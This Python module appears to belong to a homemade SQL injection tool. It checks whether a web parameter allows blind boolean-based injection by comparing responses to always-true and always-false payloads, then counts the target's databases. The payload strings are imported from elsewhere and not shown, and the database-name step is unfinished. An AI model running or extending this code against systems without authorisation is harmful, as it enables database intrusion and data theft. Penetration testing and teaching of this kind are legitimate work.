from HandleRequests import *
from STRINGS import *
from HTTPRequest import HTTPRequest

def check_if_boolean_based_is_possible(request, parameter, comment):
    """
    check if blind boolean based sqli is possible by sending an always true parameter, an always false parameter and
    comparing the results
    :param request: a HTTPRequest object whose data we will change and send
    :param parameter: the GET/POST parameter which is exploitable
    :param comment: the comment chars
    :return: a tuple of the reponses in case of false and true queries, and NOT_DETECTED if they are identical
    """
    boolean_false = send_sql_request(request, parameter, BLIND_BOOLEAN_ALWAYS_FALSE % comment)
    boolean_true = send_sql_request(request, parameter, BLIND_BOOLEAN_ALWAYS_TRUE % comment)
    if boolean_true.text != boolean_false.text:
        print(BOOLEAN_BSQLI_ENABLED)
        return boolean_false, boolean_true
    print(BOOLEAN_BSQLI_DISABLED)
    return NOT_DETECTED

def find_number_of_dbs(request, parameter, comment, true_and_false_requests):
    """

    :param request:
    :param parameter:
    :param comment:
    :param true_and_false_requests:
    :return:
    """
    for number_of_dbs in range(MAX_NUM_OF_DBS_TO_CHECK):
        response = send_sql_request(request, parameter, BLIND_BOOLEAN_COUNT_DBS % (str(number_of_dbs), comment))
        if response.text != true_and_false_requests[BOOLEAN_FALSE_RESPONSE_INDEX].text:
            return number_of_dbs
    return NOT_DETECTED



def find_db_names(request, parameter, comment, true_and_false_requests):
    """

    :param request:
    :param parameter:
    :param comment:
    :param true_and_false_requests:
    :return:
    """
    return find_number_of_dbs(request, parameter, comment, true_and_false_requests)

def boolean_based_injection(request, parameter, comment):
    """

    :param request:
    :param parameter:
    :param comment:
    :return:
    """
    true_and_false_requests = check_if_boolean_based_is_possible(request, parameter, comment)
    if true_and_false_requests != NOT_DETECTED:  # boolean is possible!
        print(find_db_names(request, parameter, comment, true_and_false_requests))
